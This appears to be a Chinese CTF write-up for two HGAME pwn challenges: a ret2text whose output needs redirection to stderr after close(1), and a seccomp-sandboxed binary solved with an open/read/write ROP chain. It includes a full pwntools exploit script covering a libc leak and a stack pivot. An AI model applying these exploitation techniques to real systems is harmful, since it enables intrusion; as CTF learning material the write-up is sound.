---
layout: post
---
## easy_overflow
就是简单的ret2text，但是回显错误

![image](https://user-images.githubusercontent.com/98165037/213620292-8aaadc0d-b292-40be-98e1-c23630219a93.png)

需要注意的是`close(1)`这个函数，当时看的是[这篇](https://blog.csdn.net/xirenwang/article/details/104139866?spm=1001.2014.3001.5506),学长写的wp上是说在`cat flag`后面加上一句`1>&2`，因为`close(1)`将程序的标准输出(stdout)关闭了导致的没有正常的回显。所以`1>&2` 让flag从标准错误输出(stderr)中输出出来（通过标准输⼊也⾏）。反正就是重定向，原来的出口被关闭了，就得重新再找一个出口

## orw

![沙盒](https://user-images.githubusercontent.com/98165037/213622015-181e9ced-25fb-4006-9ee3-6de5c39bf3cb.PNG)

首先开了沙盒

![orw2](https://user-images.githubusercontent.com/98165037/213621931-53410de0-0b73-4bff-8657-adf802f34597.PNG)

可以看到execve和execveat都无法调用了，就不能getshell，但是可以用open，read和write来获取flag

一开始想用shellcraft写shellcode到bss段，然后栈迁移过去执行，但是后来发现bss段没有执行权限，学长说可以用rop，也可以修改内存的权限或者申请一块有执行权限的内存。然后我就去尝试
rop了。

如果要执行read和write，需要控制rdi，rsi和rdx三个寄存器的值，但是我找不到pop rdx的片段，就尝试用 ret2csu。但是这个比较繁琐，后来也没打通。看wp学到了可以用ropper到libc里去找pop rdx的片段，就是最后还得加上经leak计算出来的libc_base

![image](https://user-images.githubusercontent.com/98165037/213626370-e7084618-425b-42e5-b108-770d301b8744.png)

![image](https://user-images.githubusercontent.com/98165037/213626580-e6235670-62b3-4c84-90bb-81c72bc96fa4.png)

rsi也能找到

![image](https://user-images.githubusercontent.com/98165037/213626697-40920c09-062f-4e99-9dcb-db1fdf0fb9b5.png)

这样就方便多了。

open(存储字符串‘flag’的地址，0)

思路是第一次read函数溢出得到puts函数的真实地址并返回到vuln执行，算出libc_base,因为read函数可溢出的空间不够我放下rop，所以考虑栈迁移

![image](https://user-images.githubusercontent.com/98165037/213628424-334328cb-5775-4003-ae0d-9d58a822d61b.png)

突然发现我可以直接让它从0x4012CF处开始执行，在之前覆盖的时候把rbp覆盖成bss段上的地址(比如bss_start+0x200)，然后这里执行的时候就会直接从rbp-0x100(即bss_start+0x100)处读入(官方wp上竟然也是这样的嘿嘿）

ps：之前写exp的时候是第一次read泄露puts地址，然后返回vuln进行第二次read，第二次时才覆盖rbp到bss上，并返回0x4012CF处进行第三次read，然后第三次read往bss上读rop

现在觉得可以第一次泄露puts的时候同时把rbp覆盖了，直接返回0x4012CF处，第二次read就可以直接读rop了

在rop的最后把rbp覆盖到bss+0x100的地方，再加一个leave_ret就完成了栈迁移(因为我在rop的开头放了字符串'/flag',所以rop是从bss+0x108处开始的）

exp:
```python
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
io=remote('week-1.hgame.lwsec.cn',32025)
#io=process("./orw")
elf=ELF("./orw")
libc=ELF('./libc-2.31.so')

read_addr= elf.plt['read']
put_addr = elf.plt['puts']
pop_rdi = 0x401393
pop_rbp = 0x40117d
leave_ret= 0x4012be
bss = 0x404048
main = 0x4012F0

#csu_end_addr=0x40138A
#csu_front_addr=0x401370
#pop_rsp_13_14_15= 0x40138d
#pop_rsi_15 = 0x401391

#0x0000000000142c92: pop rdx; ret;
pop_rdx = 0x142c92
#0x000000000002601f: pop rsi; ret;
pop_rsi = 0x2601f
vuln = 0x4012C0

payload = b'a'*0x108+p64(pop_rdi)+p64(elf.got['puts'])+p64(put_addr)+p64(vuln)+p64(0)
#gdb.attach(io)#,'b *0x4012F0'
io.recvuntil('.\n')
io.send(payload)

puts_got = u64(io.recv(6)+b'\x00'*2)
libc_base = puts_got- libc.sym["puts"]
write_addr = libc_base + libc.sym["write"]
open_addr =  libc_base + libc.sym["open"]
rdx_addr = libc_base + pop_rdx
rsi_addr = libc_base + pop_rsi

payload = b'b'*0x100+p64(bss+0x200)+p64(0x4012CF)+p64(0)*4
io.send(payload)
#.ljust(0x8,b'\x00')
payload = b'/flag\x00\x00\x00' #p64(bss+0x248)+p64(0x4012CF)+p64(0)*4
payload += p64(pop_rdi)+p64(bss+0x100)+p64(rsi_addr)+p64(0)+p64(open_addr)
payload += p64(pop_rdi)+p64(3)+p64(rsi_addr)+p64(bss+0x400)+p64(rdx_addr)+p64(0x100)+p64(read_addr)
payload += p64(pop_rdi)+p64(1)+p64(rsi_addr)+p64(bss+0x400)+p64(rdx_addr)+p64(0x100)+p64(write_addr)
payload += p64(0)*12+p64(bss+0x100)+p64(leave_ret)
io.send(payload)

#payload += p64(0x4012ed)*10+p64(pop_rbp)+p64(bss+0x110)

io.interactive()
```

另外我一开始调试的时候read总是有时候会多读入一点下一次的payload，有时候又正常只读完这次的payload，加了sleep也没用，学长说可以每次就发送read指定长度的payload，长度不够的地方用0补齐，果然好了
